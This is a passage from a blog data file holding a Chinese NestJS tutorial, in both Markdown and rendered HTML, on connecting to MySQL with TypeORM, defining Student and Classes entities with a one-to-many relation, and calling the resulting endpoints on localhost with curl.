id: number) {\n        return this.studentsService.getStudentName(id);\n    }\n\n    @Post('set-student-name')\n    setStudentName(@User() user: string) {\n        return this.studentsService.setStudent(user);\n    }\n}\n```\n通过对 `service` 的调用, 再经 `controller` 调用产生如下结果\n\n```bash\n// ✅ 命令行访问\ncurl -X POST http://127.0.0.1:3000/students/set-student-name -H 'Content-Type: application/json' -d '{\"user\": \"gdccwxx\"}'\n// => {\"name\":\"gdccwxx\",\"id\":1,\"updateDate\":\"2021-09-12T15:57:14.599Z\",\"createDate\":\"2021-09-12T15:57:14.599Z\"}%\n\n// ✅ 浏览器访问\nhttp://localhost:3000/students/get-name-by-id?id=1\n\n// => [{\n//  id: 1,\n//  name: \"gdccwxx\",\n//  updateDate: \"2021-09-12T15:57:14.599Z\",\n//  createDate: \"2021-09-12T15:57:14.599Z\"\n// }]\n```\n\n通过对 `service` 的 save、find 调用，就能将数据完整存入数据库了。\n\n# 六、联表查询\n我们准备新建课程表`class`，每个班级可以有多个学生，一个学生隶属一个班级。\n\n这样`学生`和`班级`就构成了 `n:1` 的关系。\n\n为了方便展示，在学生模块下直接新增 `class.entity.ts` 文件。并通过 `@OneToMany` 关联 `students`。\n\n```ts\n// classes.entity.ts\nimport { Entity, Column, PrimaryGeneratedColumn, UpdateDateColumn, CreateDateColumn, OneToMany } from 'typeorm';\nimport { Student } from './students.entity';\n\n@Entity()\nexport class Classes {\n  @PrimaryGeneratedColumn()\n  id: number;\n\n  @Column({ type: 'varchar' })\n  className: string;\n\n  @OneToMany(() => Student, student => student.class)\n  students: Student[]\n\n  @UpdateDateColumn()\n  updateDate: Date;\n\n  @CreateDateColumn()\n  createDate: Date;\n}\n```\n\n同时修改 `students.entity.ts`, 通过 `@ManyToOne` 引入 `Classes` 修改\n\n```ts\n// students.entity.ts\nimport {\n    ManyToOne,\n    // Entity...\n} from 'typeorm';\nimport { Classes } from './classes.entity';\n\n@Entity()\nexport class Student {\n  // id name updateDate, createDate...\n  @ManyToOne(() => Classes, classes => classes.students)\n  class: Classes;\n}\n```\n\n注意：`classes` 表引用 `students` 是通过新建字段(`students\\class`)进行关联。\n\n引用会最终在数据库变成`外键`连接。\n\n```bash\nshow create table student;\n// =>  CREATE TABLE `student` (\n//   `id` int NOT NULL AUTO_INCREMENT,\n//   `name` varchar(255) NOT NULL,\n//   `updateDate` datetime(6) NOT NULL DEFAULT CURRENT_TIMESTAMP(6) ON UPDATE CURRENT_TIMESTAMP(6),\n//   `createDate` datetime(6) NOT NULL DEFAULT CURRENT_TIMESTAMP(6),\n//   `classId` int DEFAULT NULL,    // 👈 注意这里\n//   PRIMARY KEY (`id`),\n//   KEY `FK_bd5c8f2ef67394162384a484ba1` (`classId`), // 👈 注意这里\n//   CONSTRAINT `FK_bd5c8f2ef67394162384a484ba1` FOREIGN KEY (`classId`) REFERENCES `classes` (`id`) // 👈 注意这里\n// ) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci\n\n\n// 而 classes 表并无链接\nshow create table classes;\n// CREATE TABLE `classes` (\n//   `id` int NOT NULL AUTO_INCREMENT,\n//   `className` varchar(255) NOT NULL,\n//   `updateDate` datetime(6) NOT NULL DEFAULT CURRENT_TIMESTAMP(6) ON UPDATE CURRENT_TIMESTAMP(6),\n//   `createDate` datetime(6) NOT NULL DEFAULT CURRENT_TIMESTAMP(6),\n//   PRIMARY KEY (`id`)\n// ) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci\n```\n\n再引入表，详细操作可看第四步。\n\n\n`students.module.ts` 引入表\n```ts\n// students.module.ts\nimport { Classes } from './entities/classes.entity';\n// ...\n\n@Module({\n    imports: [TypeOrmModule.forFeature([Student, Classes])],\n    providers: [StudentsService, Student, Classes],\n    // ..\n})\nexport class StudentsModule {}\n\n```\n\n\n`students.service.ts` 引入表, 并实现 `setClass`, `getClass` 方法\n\n```ts\nimport { Classes } from './entities/classes.entity';\n\n@Injectable()\nexport class StudentsService {\n    constructor(\n        @InjectRepository(Student)\n        private readonly studentRepository: Repository<Student>,\n        @InjectRepository(Classes)\n        private readonly classRepository: Repository<Classes>,\n    ) {}\n    // ...\n     async setClass(name: string, studentIds: number[]) {\n        const students = await this.studentRepository.find({ where: studentIds });\n        const result = await this.classRepository.save({\n            className: name,\n            students: students, // 此处直接保存students 的实例，即直接从数据库取出来的数据\n        })\n        return result;\n    }\n    async findClass(id: number) {\n        const result = await this.classRepository.find({\n            where: { id },\n            relations: ['students']\n        });\n        return result;\n    }\n}\n```\n\n新增 `ClassesDto`\n```ts\n// classes.dto.ts\nimport { IsNotEmpty, IsString } from 'class-validator';\n\nexport class ClassesDto {\n    @IsNotEmpty()\n    @IsString()\n    className: string;\n\n    students: number[]\n}\n```\n\n\n`students.controller.ts` 修改\n```typescript\n// students.controller.ts\n// import ...\nexport class StudentsController {\n    // constructor ...\n\n    @Get('get-class')\n    getClass(@Query('id', ParseIntPipe) id: number) {\n        return this.studentsService.findClass(id);\n    }\n\n    @Post('set-class')\n    setClass(@Body() classes: ClassesDto) {\n        return this.studentsService.setClass(classes.className, classes.students);\n    }\n}\n\n```\n\n`调用接口`，先插入数据再查询数据。\n\n```bash\n// 再新增一条数据\ncurl -X POST http://127.0.0.1:3000/students/set-student-name -H 'Content-Type: application/json' -d '{\"user\": \"gdccwxx1\"}'\n\n// 插入 classes 数据\ncurl -X POST http://127.0.0.1:3000/students/set-class -H 'Content-Type: application/json' -d '{\"className\": \"blog\", \"students\": [1,2]}'\n\n// ✅ 通过浏览器，查询长啥样\nhttp://localhost:3000/students/get-class?id=1\n// => [{\n//  id: 1,\n    className: \"blog\",\n    updateDate: \"2021-09-15T01:05:38.055Z\",\n    createDate: \"2021-09-15T01:05:38.055Z\",\n    students: [{\n        id: 1,\n        name: \"gdccwxx\",\n        updateDate: \"2021-09-15T01:05:38.000Z\",\n        createDate: \"2021-09-15T01:05:23.988Z\"\n    },{\n        id: 2,\n        name: \"gdccwxx1\",\n        updateDate: \"2021-09-15T01:05:38.000Z\",\n        createDate: \"2021-09-15T01:05:28.084Z\"\n    }]\n}]\n```\n\n\n# 七、简单回顾\n再回顾下本章：\n- 使用 `typeorm` 和 `mysql` 建立连接\n- 使用 `entity` 文件创建数据库表\n- `service` 使用对数据库的简单调用，包括`写入`和`读取`\n- 使用关系查询，将 `student` 和 `classes` 连接写入和查询\n\n至此，我们使用 `typeorm` 和 `mysql` 连接数据库就完成了。\n\n完整示例可以在 [github](https://github.com/gdccwxx/nest-test) 找到。\n\n{% post_link nest-js-tutorial-4 下章 %}我们将主要讲 `NestJs` 的高级用法，包括 `管道`、`守卫`和`拦截器`。期待你的阅读。\n","slug":"nest-js-tutorial-3","published":1,"updated":"2021-10-13T15:49:36.133Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckuq8nz05000v4jzxs81gzqia","content":"<p><img src=\"/img/loading.gif\" data-original=\"/nestJs/nest-js-tutorial-3/nestjs.png\" alt=\"nestjs\"></p><p>这个系列的<a href=\"/nestJs/nest-js-tutorial-2/\" title=\"上一篇\">上一篇</a>文章，实现了 <code>Post</code> 接口和对接口的基础操作。</p><p>而真正的服务往往包括数据存储。</p><p>本篇将介绍如何建立 NestJs 的数据库连接、并使用数据库联表查询。这样就就是完整的后台服务了。</p><p>完整示例可以在 <a href=\"https://github.com/gdccwxx/nest-test\" target=\"_blank\" rel=\"noopener\">github</a> 找到。</p><p>本篇使用 <code>mysql</code> 作为数据库连接。使用 <code>NestJs</code> 内置的<a href=\"https://docs.nestjs.com/techniques/database\" target=\"_blank\" rel=\"noopener\">数据库连接</a> <code>typeorm</code>，可在 <a href=\"https://typeorm.io/\" target=\"_blank\" rel=\"noopener\">这里</a> 查阅 typeorm 详细文档</p><h1 id=\"一、开发准备\"><a href=\"#一、开发准备\" class=\"headerlink\" title=\"一、开发准备\"></a>一、开发准备</h1><ol><li><a href=\"https://dev.mysql.com/downloads/mysql/\" target=\"_blank\" rel=\"noopener\">下载</a>并安装 Mysql</li><li><p>创建 school 库</p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">create database school;</span><br></pre></td></tr></table></figure></li><li><p>安装 @nestjs/typeorm typeorm mysql2</p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install --save @nestjs/typeorm typeorm mysql2</span><br></pre></td></tr></table></figure></li></ol><h1 id=\"二、数据库连接\"><a href=\"#二、数据库连接\" class=\"headerlink\" title=\"二、数据库连接\"></a>二、数据库连接</h1><figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// app.module.ts</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Module &#125; <span class=\"keyword\">from</span> <span class=\"string\">'@nestjs/common'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; AppController &#125; <span class=\"keyword\">from</span> <span class=\"string\">'./app.controller'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; AppService &#125; <span class=\"keyword\">from</span> <span class=\"string\">'./app.service'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; StudentsController &#125; <span class=\"keyword\">from</span> <span class=\"string\">'./students/students.controller'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; TypeOrmModule &#125; <span class=\"keyword\">from</span> <span class=\"string\">'@nestjs/typeorm'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Module</span>(&#123;</span><br><span class=\"line\">  imports: [</span><br><span class=\"line\">    StudentsModule,</span><br><span class=\"line\">    TypeOrmModule.forRoot(&#123;</span><br><span class=\"line\">      <span class=\"keyword\">type</span>: <span class=\"string\">'mysql'</span>,</span><br><span class=\"line\">      host: <span class=\"string\">'127.0.0.1'</span>,</span><br><span class=\"line\">      port: <span class=\"number\">3306</span>,</span><br><span class=\"line\">      username: <span class=\"string\">'root'</span>,</span><br><span class=\"line\">      password: <span class=\"string\">'1qaz2wsx'</span>,</span><br><span class=\"line\">      database: <span class=\"string\">'school'</span>,</span><br><span class=\"line\">      autoLoadEntities: <span class=\"literal\">true</span>,</span><br><span class=\"line\">      synchronize: <span class=\"literal\">true</span>, <span class=\"comment\">// 数据库自动同步 entity 文件修改</span></span><br><span class=\"line\">    &#125;),</span><br><span class=\"line\">  ],</span><br><span class=\"line\">  controllers: [AppController],</span><br><span class=\"line\">  providers: [AppService],</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> AppModule &#123;&#125;</span><br></pre></td></tr></table></figure><p>初始化数据库连接。</p><p><code>autoLoadEntities</code> 自动化 load entity 文件, \b\b所有在 Module 中引用的 Entity 文件会被自动加载。自动加载设置为 true 即可。</p><p><code>synchronize</code> 自动化同步表，本地可自动打开，线上数据库不建议打开。</p><h1 id=\"三、定义表结构\"><a href=\"#三、定义表结构\" class=\"headerlink\" title=\"三、定义表结构\"></a>三、定义表结构</h1><figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> &#123;</span><br><span class=\"line\">    Entity,</span><br><span class=\"line\">    Column,</span><br><span class=\"line\">    PrimaryGeneratedColumn,</span><br><span class=\"line\">    UpdateDateColumn,</span><br><span class=\"line\">    CreateDateColumn,</span><br><span class=\"line\">&#125; <span class=\"keyword\">from</span> <span class=\"string\">'typeorm'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Entity</span>()</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> Student &#123;</span><br><span class=\"line\">  <span class=\"meta\">@PrimaryGeneratedColumn</span>()</span><br><span class=\"line\">  id: <span class=\"built_in\">number</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"meta\">@Column</span>(&#123; <span class=\"keyword\">type</span>: <span class=\"string\">'varchar'</span> &#125;)</span><br><span class=\"line\">  name: <span class=\"built_in\">string</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"meta\">@UpdateDateColumn</span>()</span><br><span class=\"line\">  updateDate: <span class=\"built_in\">Date</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"meta\">@CreateDateColumn</span>()</span><br><span class=\"line\">  createDate: <span class=\"built_in\">Date</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>@Entity</code> 注解代表是数据库入口文件；</li><li><code>@Column</code> 是基础列文件，使用 <code>type</code> 字段定义在数据库实际存储</li><li><code>@PrimaryGeneratedColumn</code> 代表单调递增的主键</li><li><code>@UpdateDateColumn</code>\b 当记录修改时会修改时间</li><li><code>@CreateDateColumn</code>\b 当记录新增时会写入时间</li></ul><h1 id=\"四、引用表\"><a href=\"#四、引用表\" class=\"headerlink\" title=\"四、引用表\"></a>四、引用表</h1><figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// students.module.ts</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Module &#125; <span class=\"keyword\">from</span> <span class=\"string\">'@nestjs/common'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Student &#125; <span class=\"keyword\">from</span> <span class=\"string\">'./entities/students.entity'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; TypeOrmModule &#125; <span class=\"keyword\">from</span> <span class=\"string\">'@nestjs/typeorm'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; StudentsController &#125; <span class=\"keyword\">from</span> <span class=\"string\">'./students.controller'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; StudentsService &#125; <span class=\"keyword\">from</span> <span class=\"string\">'./students.service'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Module</span>(&#123;</span><br><span class=\"line\">    imports: [TypeOrmModule.forFeature([Student])],</span><br><span class=\"line\">    providers: [StudentsService, Student],</span><br><span class=\"line\">    controllers: [StudentsController],</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> StudentsModule &#123;&#125;</span><br></pre></td></tr></table></figure><ul><li><code>imports</code> 引用 typeorm 模块， entity 才可以在 service 中使用</li><li><code>providers</code> service 的 constructor 需要引用哪些模块</li><li><code>controllers</code> 模块的 controller</li></ul><figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// students.service.ts</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Injectable, Logger &#125; <span class=\"keyword\">from</span> <span class=\"string\">'@nestjs/common'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; InjectRepository &#125; <span class=\"keyword\">from</span> <span class=\"string\">'@nestjs/typeorm'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Repository &#125; <span class=\"keyword\">from</span> <span class=\"string\">'typeorm'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Student &#125; <span class=\"keyword\">from</span> <span class=\"string\">'./entities/students.entity'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Injectable</span>()</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> StudentsService &#123;</span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>(<span class=\"params\"></span></span><br><span class=\"line\"><span class=\"params\">        <span class=\"meta\">@InjectRepository</span>(Student)</span></span><br><span class=\"line\"><span class=\"params\">        <span class=\"keyword\">private</span> readonly studentRepository: Repository&lt;Student&gt;,</span></span><br><span class=\"line\"><span class=\"params\">    </span>) &#123;&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p>这样会在 db 中建立 students 新表。</p><p>使用 <code>show create table</code> 能看表的详细信息。</p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">use school;</span><br><span class=\"line\"></span><br><span class=\"line\">show tables;</span><br><span class=\"line\"></span><br><span class=\"line\">// =&gt; | student | CREATE TABLE `student` (</span><br><span class=\"line\">//  `id` int NOT NULL AUTO_INCREMENT,</span><br><span class=\"line\">//  `updateDate` datetime(6) NOT NULL DEFAULT CURRENT_TIMESTAMP(6) ON UPDATE CURRENT_TIMESTAMP(6),</span><br><span class=\"line\">//  `createDate` datetime(6) NOT NULL DEFAULT CURRENT_TIMESTAMP(6),</span><br><span class=\"line\">//  `name` varchar(255) NOT NULL,</span><br><span class=\"line\">//  PRIMARY KEY (`id`)</span><br><span class=\"line\">// ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci |</span><br></pre></td></tr></table></figure><h1 id=\"五、与数据库交互\"><a href=\"#五、与数据库交互\" class=\"headerlink\" title=\"五、与数据库交互\"></a>五、与数据库交互</h1><p>到这一步，终于可以和数据库进行交互了。基本上和数据库交互的部分都会放在 service 层，因此 <code>新增</code> 和 <code>查询</code> 都放在 service 层。</p><p>其中包括了</p><ul><li><code>getStudentName</code> 的改造</li><li><code>setStudent</code> 函数的新增</li></ul><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// students.service.ts</span></span><br><span class=\"line\"><span class=\"comment\">// import ...</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Injectable</span>()</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> StudentsService &#123;</span><br><span class=\"line\">    <span class=\"comment\">// logger, constructor ImStudent getStudentName ...</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">async</span> getStudentName(id: <span class=\"built_in\">number</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.logger.log(<span class=\"string\">`get student id is <span class=\"subst\">$&#123;id&#125;</span>`</span>);</span><br><span class=\"line\">        <span class=\"keyword\">const</span> results = <span class=\"keyword\">await</span> <span class=\"keyword\">this</span>.studentRepository.find(&#123; id &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> results ?? <span class=\"string\">'not found'</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">async</span> setStudent(name: <span class=\"built_in\">string</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">const</span> results = <span class=\"keyword\">this</span>.studentRepository.create(&#123; name &#125;);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> results;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p>通过使用 <code>find</code> 和 <code>create</code> 对学生查询和创建。结果也是异步的。</p><p>下面对 <code>controller</code> 进行改造，使得函数调用串起来。</p><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// students.controller.ts</span></span><br><span class=\"line\"><span class=\"comment\">// import ...</span></span><br><span class=\"line\"><span class=\"meta\">@Controller</span>(<span class=\"string\">'students'</span>)</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> StudentsController &#123;</span><br><span class=\"line\">    <span class=\"comment\">// constructor whoAreYou whoAreYouPost whoIsReq ..</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Get</span>(<span class=\"string\">'get-name-by-id'</span>)</span><br><span class=\"line\">    getNameById(<span class=\"meta\">@Query</span>(<span class=\"string\">'id'</span>, ParseIntPipe) id: <span class=\"built_in\">number</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.studentsService.getStudentName(id);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Post</span>(<span class=\"string\">'set-student-name'</span>)</span><br><span class=\"line\">    setStudentName(<span class=\"meta\">@User</span>() user: <span class=\"built_in\">string</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.studentsService.setStudent(user);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p>通过对 <code>service</code> 的调用, 再经 <code>controller</code> 调用产生如下结果</p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ✅ 命令行访问</span><br><span class=\"line\">curl -X POST http://127.0.0.1:3000/students/<span class=\"built_in\">set</span>-student-name -H <span class=\"string\">'Content-Type: application/json'</span> -d <span class=\"string\">'&#123;\"user\": \"gdccwxx\"&#125;'</span></span><br><span class=\"line\">// =&gt; &#123;<span class=\"string\">\"name\"</span>:<span class=\"string\">\"gdccwxx\"</span>,<span class=\"string\">\"id\"</span>:1,<span class=\"string\">\"updateDate\"</span>:<span class=\"string\">\"2021-09-12T15:57:14.599Z\"</span>,<span class=\"string\">\"createDate\"</span>:<span class=\"string\">\"2021-09-12T15:57:14.599Z\"</span>&#125;%</span><br><span class=\"line\"></span><br><span class=\"line\">// ✅ 浏览器访问</span><br><span class=\"line\">http://localhost:3000/students/get-name-by-id?id=1</span><br><span class=\"line\"></span><br><span class=\"line\">// =&gt; [&#123;</span><br><span class=\"line\">//  id: 1,</span><br><span class=\"line\">//  name: <span class=\"string\">\"gdccwxx\"</span>,</span><br><span class=\"line\">//  updateDate: <span class=\"string\">\"2021-09-12T15:57:14.599Z\"</span>,</span><br><span class=\"line\">//  createDate: <span class=\"string\">\"2021-09-12T15:57:14.599Z\"</span></span><br><span class=\"line\">// &#125;]</span><br></pre></td></tr></table></figure><p>通过对 <code>service</code> 的 save、find 调用，就能将数据完整存入数据库了。</p><h1 id=\"六、联表查询\"><a href=\"#六、联表查询\" class=\"headerlink\" title=\"六、联表查询\"></a>六、联表查询</h1><p>我们准备新建课程表<code>class</code>，每个班级可以有多个学生，一个学生隶属一个班级。</p><p>这样<code>学生</code>和<code>班级</code>就构成了 <code>n:1</code> 的关系。</p><p>为了方便展示，在学生模块下直接新增 <code>class.entity.ts</code> 文件。并通过 <code>@OneToMany</code> 关联 <code>students</code>。</p><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// classes.entity.ts</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Entity, Column, PrimaryGeneratedColumn, UpdateDateColumn, CreateDateColumn, OneToMany &#125; <span class=\"keyword\">from</span> <span class=\"string\">'typeorm'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Student &#125; <span class=\"keyword\">from</span> <span class=\"string\">'./students.entity'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Entity</span>()</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> Classes &#123;</span><br><span class=\"line\">  <span class=\"meta\">@PrimaryGeneratedColumn</span>()</span><br><span class=\"line\">  id: <span class=\"built_in\">number</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"meta\">@Column</span>(&#123; <span class=\"keyword\">type</span>: <span class=\"string\">'varchar'</span> &#125;)</span><br><span class=\"line\">  className: <span class=\"built_in\">string</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"meta\">@OneToMany</span>(<span class=\"function\"><span class=\"params\">()</span> =&gt;</span> Student, <span class=\"function\"><span class=\"params\">student</span> =&gt;</span> student.class)</span><br><span class=\"line\">  students: Student[]</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"meta\">@UpdateDateColumn</span>()</span><br><span class=\"line\">  updateDate: <span class=\"built_in\">Date</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"meta\">@CreateDateColumn</span>()</span><br><span class=\"line\">  createDate: <span class=\"built_in\">Date</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p>同时修改 <code>students.entity.ts</code>, 通过 <code>@ManyToOne</code> 引入 <code>Classes</code> 修改</p><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// students.entity.ts</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123;</span><br><span class=\"line\">    ManyToOne,</span><br><span class=\"line\">    <span class=\"comment\">// Entity...</span></span><br><span class=\"line\">&#125; <span class=\"keyword\">from</span> <span class=\"string\">'typeorm'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Classes &#125; <span class=\"keyword\">from</span> <span class=\"string\">'./classes.entity'</span>;</span><br><span 